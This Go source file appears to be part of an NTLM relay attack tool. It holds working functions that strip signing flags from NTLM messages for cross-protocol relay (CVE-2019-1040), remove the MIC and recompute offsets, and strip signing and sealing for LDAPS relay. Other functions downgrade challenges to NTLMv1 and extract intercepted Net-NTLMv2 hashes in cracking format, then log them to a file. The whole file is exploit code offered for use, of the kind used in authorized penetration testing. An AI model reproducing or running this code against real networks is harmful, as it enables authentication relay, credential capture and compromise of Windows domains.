// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package relay

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"sync"
)

// NTLM flag constants used for manipulation.
const (
	ntlmsspNegotiateUnicode    = 1 << 0
	ntlmsspNegotiateSign       = 1 << 4
	ntlmsspNegotiateSeal       = 1 << 5
	ntlmsspNegotiateAlwaysSign = 1 << 15
	ntlmsspNegotiateVersion    = 1 << 25
	ntlmsspNegotiateKeyExch    = 1 << 30
)

// removeSigningFlags strips NTLMSSP_NEGOTIATE_SIGN and NTLMSSP_NEGOTIATE_ALWAYS_SIGN
// from an NTLM Type1 (Negotiate) message. Used for cross-protocol relay (CVE-2019-1040).
func removeSigningFlags(ntlmMsg []byte) []byte {
	if len(ntlmMsg) < 16 {
		return ntlmMsg
	}
	// Make a copy to avoid modifying the original
	msg := make([]byte, len(ntlmMsg))
	copy(msg, ntlmMsg)

	// Flags are at offset 12 (4 bytes, little-endian)
	flags := binary.LittleEndian.Uint32(msg[12:16])
	flags &^= ntlmsspNegotiateSign
	flags &^= ntlmsspNegotiateAlwaysSign
	binary.LittleEndian.PutUint32(msg[12:16], flags)
	return msg
}

// removeMIC removes the Version and MIC fields from an NTLM Type3 (Authenticate)
// message and recalculates payload offsets. Matches Impacket's structured approach:
// it clears SIGN, ALWAYS_SIGN, KEY_EXCH, VERSION flags, removes the Version (8 bytes)
// and MIC (16 bytes) fields entirely, and shifts all payload data 24 bytes earlier
// with updated field descriptor offsets. This ensures the message is self-consistent
// regardless of whether the original Type3 had a MIC.
func removeMIC(ntlmMsg []byte) []byte {
	if len(ntlmMsg) < 64 {
		return ntlmMsg
	}

	flags := binary.LittleEndian.Uint32(ntlmMsg[60:64])

	// Determine how many bytes to strip between the fixed header (offset 64)
	// and the payload. Version = 8 bytes if NEGOTIATE_VERSION set, MIC = 16 bytes
	// if payload starts at 88+.
	hasVersion := flags&ntlmsspNegotiateVersion != 0
	if !hasVersion {
		// No Version field means no MIC either — nothing to remove
		return ntlmMsg
	}

	// Find the minimum payload offset to determine if MIC is present
	minPayload := uint32(len(ntlmMsg))
	for _, f := range []int{12, 20, 28, 36, 44, 52} {
		fLen := binary.LittleEndian.Uint16(ntlmMsg[f : f+2])
		fOff := binary.LittleEndian.Uint32(ntlmMsg[f+4 : f+8])
		if fLen > 0 && fOff < minPayload {
			minPayload = fOff
		}
	}

	// Calculate bytes to strip: Version (8) + MIC if present (16)
	var stripBytes uint32
	if minPayload >= 88 {
		stripBytes = 24 // Version (8) + MIC (16)
	} else if minPayload >= 72 {
		stripBytes = 8 // Version only (no MIC)
	} else {
		// Payload starts at 64 — no Version or MIC fields present despite flag
		return ntlmMsg
	}

	// Build new message: fixed header (64 bytes) + payload (everything after stripped region)
	payloadStart := 64 + stripBytes
	msg := make([]byte, 0, len(ntlmMsg)-int(stripBytes))
	msg = append(msg, ntlmMsg[:64]...)           // Fixed header with flags
	msg = append(msg, ntlmMsg[payloadStart:]...) // Payload shifted left

	// Clear flags: VERSION, SIGN, ALWAYS_SIGN, KEY_EXCH
	newFlags := binary.LittleEndian.Uint32(msg[60:64])
	newFlags &^= ntlmsspNegotiateVersion
	newFlags &^= ntlmsspNegotiateSign
	newFlags &^= ntlmsspNegotiateAlwaysSign
	newFlags &^= ntlmsspNegotiateKeyExch
	binary.LittleEndian.PutUint32(msg[60:64], newFlags)

	// Update all 6 field descriptor offsets (subtract stripBytes)
	for _, f := range []int{12, 20, 28, 36, 44, 52} {
		fLen := binary.LittleEndian.Uint16(msg[f : f+2])
		if fLen > 0 {
			fOff := binary.LittleEndian.Uint32(msg[f+4 : f+8])
			if fOff >= payloadStart {
				binary.LittleEndian.PutUint32(msg[f+4:f+8], fOff-stripBytes)
			}
		}
	}

	return msg
}

// stripType3SigningForLDAPS strips NEGOTIATE_SIGN, NEGOTIATE_SEAL, and NEGOTIATE_ALWAYS_SIGN
// from a Type3 message's NegotiateFlags field and invalidates the MIC.
// This is required for LDAPS relay because the DC returns error 48
// ("Cannot start kerberos signing/sealing when using TLS/SSL") if signing flags are present.
// Since modifying flags invalidates the MIC, we use removeMIC to safely strip it.
// Note: May fail on fully patched DCs that enforce MIC validation.
func stripType3SigningForLDAPS(ntlmMsg []byte) []byte {
	if len(ntlmMsg) < 64 {
		return ntlmMsg
	}

	// First remove Version+MIC safely (handles offset recalculation)
	msg := removeMIC(ntlmMsg)

	// Strip SEAL from flags (removeMIC already clears SIGN, ALWAYS_SIGN, KEY_EXCH, VERSION)
	flags := binary.LittleEndian.Uint32(msg[60:64])
	flags &^= ntlmsspNegotiateSeal
	binary.LittleEndian.PutUint32(msg[60:64], flags)

	return msg
}

// extractNetNTLMv2Hash extracts a Net-NTLMv2 hash from the Type2 challenge and Type3
// authenticate messages. Returns the hash in hashcat/john format:
//
//	username::domain:serverChallenge:NTProofStr:ntChallengeResponseBlob
//
// The server challenge is 8 bytes at offset 24 in the Type2 message.
// The NtChallengeResponse is extracted from Type3 fields at offset 20.
// NTProofStr is the first 16 bytes; the rest is the client challenge blob.
func extractNetNTLMv2Hash(type2, type3 []byte, domain, user string) string {
	// Extract server challenge from Type2 (8 bytes at offset 24)
	if len(type2) < 32 {
		return ""
	}
	serverChallenge := hex.EncodeToString(type2[24:32])

	// Extract NtChallengeResponse from Type3
	// NtChallengeResponseFields: Len(2) MaxLen(2) Offset(4) at offset 20
	if len(type3) < 28 {
		return ""
	}
	ntLen := binary.LittleEndian.Uint16(type3[20:22])
	ntOffset := binary.LittleEndian.Uint32(type3[24:28])

	if ntLen < 16 || int(ntOffset)+int(ntLen) > len(type3) {
		return ""
	}

	ntResponse := type3[ntOffset : ntOffset+uint32(ntLen)]
	ntProofStr := hex.EncodeToString(ntResponse[:16])
	ntBlob := hex.EncodeToString(ntResponse[16:])

	return fmt.Sprintf("%s::%s:%s:%s:%s", user, domain, serverChallenge, ntProofStr, ntBlob)
}

var hashFileMu sync.Mutex

// logCapturedHash logs a Net-NTLMv2 hash and optionally writes it to the output file.
func logCapturedHash(hash, outputFile string) {
	log.Printf("[*] %s", hash)

	if outputFile == "" {
		return
	}

	hashFileMu.Lock()
	defer hashFileMu.Unlock()

	f, err := os.OpenFile(outputFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[-] Failed to write hash to %s: %v", outputFile, err)
		return
	}
	defer f.Close()
	fmt.Fprintln(f, hash)
}

// downgradeToNTLMv1 modifies a Type2 (Challenge) message flags to request NTLMv1
// by removing the NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY flag.
func downgradeToNTLMv1(ntlmType2 []byte) []byte {
	if len(ntlmType2) < 24 {
		return ntlmType2
	}
	msg := make([]byte, len(ntlmType2))
	copy(msg, ntlmType2)

	// Flags in Type2 are at offset 20 (4 bytes, little-endian)
	flags := binary.LittleEndian.Uint32(msg[20:24])
	flags &^= 1 << 19 // NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
	binary.LittleEndian.PutUint32(msg[20:24], flags)
	return msg
}
